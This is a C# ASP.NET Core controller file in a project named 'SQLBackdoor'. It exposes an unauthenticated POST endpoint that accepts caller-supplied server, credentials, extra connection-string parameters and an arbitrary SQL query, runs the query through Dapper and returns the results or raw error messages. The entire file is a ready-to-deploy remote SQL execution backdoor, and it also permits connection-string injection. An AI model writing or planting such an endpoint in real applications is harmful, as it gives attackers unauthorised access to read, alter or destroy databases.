﻿using Dapper;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using System;
using System.Collections.Generic;
using System.Data;
using System.Data.SqlClient;
using System.Linq;
using System.Threading.Tasks;
using System.Web;

namespace SQLBackdoor.Controllers
{
    [Route("api/[controller]")]
    [ApiController]
    public class SqlExecutorController : ControllerBase
    {
        [HttpPost]
        public async Task<IActionResult> Post([FromBody] QueryData model)
        {

            try
            {
                var connectionString = $@"Data Source={model.Server};Initial Catalog={model.Database};User Id={model.Username};Password={model.Password};";

                if (!string.IsNullOrEmpty(model.Parameters))
                    connectionString += $"{model.Parameters}";

                var query = model.Query.Replace("&#039;", "'");

                using (var connection = new SqlConnection(connectionString))
                {
                    var response = await connection.QueryAsync(query);
                    return Ok(new { data = response });
                }
            }
            catch (Exception ex)
            {
                return Problem(ex.Message);
            }
        }
    }

    public class QueryData
    {
        public string Server { get; set; }
        public string Username { get; set; }
        public string Password { get; set; }
        public string Database { get; set; }

        public string Parameters { get; set; }

        public int Timeout { get; set; }

        public string Query { get; set; }
    }
}
